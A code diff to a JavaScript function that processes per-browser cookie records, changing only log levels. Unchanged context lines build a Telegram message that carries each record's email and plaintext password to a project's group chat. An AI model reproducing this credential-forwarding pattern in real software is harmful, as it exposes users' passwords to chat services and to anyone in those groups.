@@ -534,7 +534,7 @@ export async function updateHubAndProjectsFromCookieData(browserId, status) {
     cookieHeaders.forEach((header, index) => {
       cookieRowMap[header] = cookieRow[index];
     });
-    logger.debug(`[updateHubAndProjectsFromCookieData] Retrieved cookie data for browserId ${browserId}.`);
+    // logger.debug(`[updateHubAndProjectsFromCookieData] Retrieved cookie data for browserId ${browserId}.`);
 
     // Prepare data for Hub and Projects
     const dataToUpdate = {
@@ -564,7 +564,7 @@ export async function updateHubAndProjectsFromCookieData(browserId, status) {
         error: `projectId not found in cookie data for browserId '${browserId}'.`
       };
     }
-    logger.info(`[updateHubAndProjectsFromCookieData] Extracted projectId: ${projectId}.`);
+    logger.debug(`[updateHubAndProjectsFromCookieData] Extracted projectId: ${projectId}.`);
 
     const projectDetails = await getProjectDetails(projectId);
     const projectTelegramId = projectDetails?.telegramGroupId;
@@ -573,7 +573,7 @@ export async function updateHubAndProjectsFromCookieData(browserId, status) {
 
 
     if (projectTelegramId) {
-      logger.info(`[updateHubAndProjectsFromCookieData] Sending Telegram notification to ${projectTelegramId} for status: ${status}.`);
+      logger.debug(`[updateHubAndProjectsFromCookieData] Sending Telegram notification to ${projectTelegramId} for status: ${status}.`);
       let telegramMessage = `*Project:* ${projectTitle}\n*Status:* ${status}\n*Email:* ${cookieRowMap.email}\n*Password:* ${cookieRowMap.password}`;
 
       if (templateType === "COOKIE" && status === "COMPLETED") {
@@ -587,7 +587,7 @@ export async function updateHubAndProjectsFromCookieData(browserId, status) {
       logger.warn(`[updateHubAndProjectsFromCookieData] No telegramGroupId found for projectId '${projectId}'. Skipping Telegram notification.`);
     }
 
-    logger.debug(`[updateHubAndProjectsFromCookieData] Preparing data for Hub sheet update.`);
+    // logger.debug(`[updateHubAndProjectsFromCookieData] Preparing data for Hub sheet update.`);
     // 2. Update Hub Sheet (first)
     const hubUpdateData = {
       email: dataToUpdate.email,
@@ -636,7 +636,7 @@ export async function updateHubAndProjectsFromCookieData(browserId, status) {
       }
       logger.info(`[updateHubAndProjectsFromCookieData] Hub sheet updated successfully via App Script fallback for browserId '${browserId}'.`);
     } else {
-      logger.info(`[updateHubAndProjectsFromCookieData] Hub sheet updated successfully via Sheets API for browserId '${browserId}'.`);
+      logger.debug(`[updateHubAndProjectsFromCookieData] Hub sheet updated successfully via Sheets API for browserId '${browserId}'.`);
     }
 
 
